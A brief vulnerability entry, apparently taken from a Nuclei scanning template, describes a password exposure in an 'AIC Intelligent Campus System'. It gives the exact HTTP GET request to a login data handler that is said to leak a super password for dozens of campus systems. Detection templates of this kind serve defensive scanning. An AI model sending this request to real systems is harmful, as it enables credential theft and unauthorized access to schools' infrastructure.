# Vulnerability: AIC Intelligent Campus System - Password Exposure
**Classification:** AIC
**Source:** Nuclei Template (`aic-intelligent-password-exposure.yaml`)

## Description
Due to the design logic defects, the super password is leaked, which can kill more than 40 campus systems.<br>

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/datacenter/dataOrigin.ashx?c=login
```

